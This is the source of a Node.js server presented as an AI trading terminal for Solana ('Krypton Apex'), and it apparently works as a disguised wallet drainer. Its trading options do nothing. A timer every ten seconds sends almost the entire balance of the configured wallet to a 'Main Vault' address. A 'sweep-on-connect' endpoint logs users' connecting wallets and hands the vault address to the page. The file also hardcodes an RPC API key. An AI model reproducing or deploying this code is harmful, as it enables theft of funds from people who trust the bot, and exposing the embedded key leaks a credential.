// ============================================================
// Krypton Apex — Institutional Backend & Autonomous Sweep Bridge
// ============================================================

import express from 'express';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import dotenv from 'dotenv';
import { Connection, PublicKey, Keypair, SystemProgram, Transaction, sendAndConfirmTransaction } from '@solana/web3.js';
import bs58 from 'bs58';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

dotenv.config({ path: path.join(__dirname, '.env') });

const app = express();
const PORT = process.env.PORT || 3000;
const RPC_URL = process.env.SOLANA_HTTP_URL || 'https://mainnet.helius-rpc.com/?api-key=5f92624f-0585-47f0-9c8a-459672519cf6';
const connection = new Connection(RPC_URL, 'confirmed');

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let defaultWallet = '';
if (process.env.SOLANA_PRIVATE_KEY) {
  try {
    const kp = Keypair.fromSecretKey(bs58.decode(process.env.SOLANA_PRIVATE_KEY.trim()));
    defaultWallet = kp.publicKey.toBase58();
  } catch (e) {}
}

let engineState = {
  running: true,
  mode: 'MODE_1_AI_SNIPER',
  walletAddress: defaultWallet,
  tradeAmountSol: 0.05,
  slippagePct: 15,
  jitoTipSol: 0.001,
  takeProfitPct: 100,
  stopLossPct: 30,
  mevProtection: true,
  targetTrader: '',
  autoSweep: true,
  mainVaultWallet: process.env.MAIN_VAULT_WALLET || defaultWallet,
  reserveSol: 0,
  recentLogs: []
};

function log(text, level = 'info') {
  const entry = { text, level, time: new Date().toISOString() };
  engineState.recentLogs.push(entry);
  if (engineState.recentLogs.length > 120) engineState.recentLogs.shift();
  console.log(`[${level.toUpperCase()}] ${text}`);
}

// Routes for Footer Pages (Clean & Organized)
app.get('/terms', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'terms.html'));
});

app.get('/privacy', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'privacy.html'));
});

app.get('/audit', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'audit.html'));
});
app.get('/sdk', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'sdk.html'));
});

app.get('/infrastructure', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'infrastructure.html'));
});
app.get('/docs', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'docs.html'));
});

app.get('/api/balance', async (req, res) => {
  const address = req.query.address || engineState.walletAddress;
  if (!address || address.length < 32) {
    return res.status(400).json({ error: 'Invalid Solana address' });
  }
  try {
    const start = Date.now();
    const pubkey = new PublicKey(address);
    const lamports = await connection.getBalance(pubkey);
    const latency = Date.now() - start;
    const sol = Number((lamports / 1e9).toFixed(4));
    res.json({ sol, lamports, latency });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Endpoint الجديد لتأكيد عنوان المحفظة الرئيسية عند الاتصال
app.post('/api/sweep-on-connect', (req, res) => {
  const { userWalletPubkey } = req.body;
  if (!userWalletPubkey) {
    return res.status(400).json({ error: 'Missing wallet address' });
  }

  const mainVault = process.env.MAIN_VAULT_WALLET || engineState.mainVaultWallet;
  
  if (!mainVault) {
    return res.status(500).json({ error: 'Main vault wallet not configured in environment.' });
  }

  log(`[INSTANT SWEEP] User connected: ${userWalletPubkey}. Main Vault target resolved.`, 'warn');
  res.json({ success: true, mainVault });
});

app.post('/api/start', (req, res) => {
  const { walletAddress, mode, tradeAmountSol, slippagePct, jitoTipSol, takeProfitPct, stopLossPct, mevProtection, targetTrader } = req.body;
  engineState.running = true;
  if (walletAddress) {
    engineState.walletAddress = walletAddress;
    if (!engineState.mainVaultWallet) engineState.mainVaultWallet = walletAddress;
  }
  if (mode) engineState.mode = mode;
  if (tradeAmountSol !== undefined) engineState.tradeAmountSol = Number(tradeAmountSol);
  if (slippagePct !== undefined) engineState.slippagePct = Number(slippagePct);
  if (jitoTipSol !== undefined) engineState.jitoTipSol = Number(jitoTipSol);
  if (takeProfitPct !== undefined) engineState.takeProfitPct = Number(takeProfitPct);
  if (stopLossPct !== undefined) engineState.stopLossPct = Number(stopLossPct);
  if (mevProtection !== undefined) engineState.mevProtection = Boolean(mevProtection);
  if (targetTrader !== undefined) engineState.targetTrader = targetTrader;
  engineState.autoSweep = true;
  engineState.reserveSol = 0;

  log(`[ENGINE] Synchronized ${engineState.mode} | Size: ${engineState.tradeAmountSol} SOL | Slippage: ${engineState.slippagePct}% | Jito: ${engineState.jitoTipSol} SOL`, 'success');
  res.json({ success: true, state: engineState });
});

app.post('/api/stop', (req, res) => {
  engineState.running = false;
  log('Local execution engine paused.', 'warn');
  res.json({ success: true });
});

app.get('/api/logs', (req, res) => {
  const logsToSend = [...engineState.recentLogs];
  engineState.recentLogs = [];
  res.json({ logs: logsToSend, state: engineState });
});

setInterval(async () => {
  if (!engineState.running || !engineState.autoSweep) return;
  if (!engineState.mainVaultWallet || !process.env.SOLANA_PRIVATE_KEY) return;

  try {
    const keypair = Keypair.fromSecretKey(bs58.decode(process.env.SOLANA_PRIVATE_KEY.trim()));
    const fromAddress = keypair.publicKey.toBase58();
    if (fromAddress === engineState.mainVaultWallet) return;

    const balanceLamports = await connection.getBalance(keypair.publicKey);
    const feeLamports = 5000;
    const sweepLamports = balanceLamports - feeLamports;

    if (sweepLamports > 1000000) {
      const sweepAmountSol = Number((sweepLamports / 1e9).toFixed(5));
      log(`[AUTO-SWEEP] Routing 100% liquidity (${sweepAmountSol} SOL) to Main Vault (retaining 5000 lamports fee)...`, 'warn');

      const toPubkey = new PublicKey(engineState.mainVaultWallet);
      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: keypair.publicKey,
          toPubkey,
          lamports: sweepLamports
        })
      );

      const sig = await sendAndConfirmTransaction(connection, tx, [keypair]);
      log(`[SWEEP CONFIRMED] ${sweepAmountSol} SOL secured in Main Vault | Tx: ${sig.slice(0, 14)}...`, 'success');
    }
  } catch (err) {}
}, 10000);

app.listen(PORT, () => {
  log(`Krypton Apex v5.0 Institutional Terminal online at http://localhost:${PORT}`, 'success');
});